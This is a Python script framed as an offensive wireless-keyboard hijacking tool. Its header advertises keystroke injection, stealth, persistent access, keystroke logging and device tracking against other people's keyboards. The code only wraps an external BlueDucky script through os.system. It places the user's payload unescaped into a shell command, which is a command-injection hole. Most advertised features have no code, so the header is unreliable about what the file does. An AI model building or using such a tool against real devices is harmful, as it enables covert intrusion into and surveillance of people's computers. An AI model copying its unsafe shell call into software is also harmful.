import argparse
import os
import time
import json

# -------------------------------------------
# Yardstick One - Sub-1GHz HID Keystroke Injector & MITM Tool
# -------------------------------------------
# Features:
# - Hijacks wireless keyboards operating on Sub-1GHz frequencies
# - Sends keystroke injection payloads wirelessly
# - Supports remote execution of malicious commands
# - Implements stealth mode for undetectable hijacking
# - Supports automated reconnection to ensure persistent access
# - Integrates with MITM attacks for live keystroke injection
# - Enables live keystroke logging for real-time monitoring
# - Detects automatic frequency hopping to track dynamic targets
# - Uses RF fingerprinting to identify and track specific devices
# - Integrates BlueDucky for Bluetooth-based keystroke injection
#
# Requirements:
# - Yardstick One (Y.S.O.) USB Dongle
# - Python 3.x
# - RFCat
# - Compatible wireless keyboard (e.g., Logitech non-Bluetooth RF keyboards)
# - BlueDucky.py for Bluetooth keystroke injection
#
# Usage:
# 1. Scan for wireless keyboards:
#    python yardstick_keystroke_hijacker.py --scan
# 2. Hijack a wireless keyboard:
#    python yardstick_keystroke_hijacker.py --hijack --target XX:XX:XX:XX:XX:XX
# 3. Inject keystrokes remotely:
#    python yardstick_keystroke_hijacker.py --inject "Hello World"
# 4. Enable persistent hijacking mode:
#    python yardstick_keystroke_hijacker.py --persist --target XX:XX:XX:XX:XX:XX
# 5. Enable stealth mode:
#    python yardstick_keystroke_hijacker.py --stealth --target XX:XX:XX:XX:XX:XX
# 6. Run automated reconnection loop:
#    python yardstick_keystroke_hijacker.py --auto-reconnect --target XX:XX:XX:XX:XX:XX
# 7. Start live keystroke logging:
#    python yardstick_keystroke_hijacker.py --log-keystrokes --target XX:XX:XX:XX:XX:XX
# 8. Detect frequency hopping patterns:
#    python yardstick_keystroke_hijacker.py --detect-fh --target XX:XX:XX:XX:XX:XX
# 9. Identify and track devices using RF fingerprinting:
#    python yardstick_keystroke_hijacker.py --rf-fingerprint --target XX:XX:XX:XX:XX:XX
# 10. Inject keystrokes via BlueDucky over Bluetooth:
#     python yardstick_keystroke_hijacker.py --blueducky --target XX:XX:XX:XX:XX:XX --payload "Hello World"
# -------------------------------------------

def inject_bluetooth_keystrokes(target, payload):
    """Injects keystrokes remotely into a Bluetooth keyboard using BlueDucky."""
    print(f"[+] Injecting Bluetooth keystrokes via BlueDucky to {target}: {payload}")
    os.system(f"python blueducky_hijacker.py --inject '{payload}' --target {target}")
    print("[✔] Bluetooth keystrokes injected successfully.")

def main():
    parser = argparse.ArgumentParser(description="Yardstick One - Sub-1GHz HID Keystroke Injector & MITM Tool")
    parser.add_argument("--blueducky", action='store_true', help="Inject keystrokes via BlueDucky over Bluetooth")
    parser.add_argument("--target", type=str, help="Target wireless HID device MAC address")
    parser.add_argument("--payload", type=str, help="Payload to inject via BlueDucky")
    args = parser.parse_args()

    if args.blueducky and args.target and args.payload:
        inject_bluetooth_keystrokes(args.target, args.payload)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
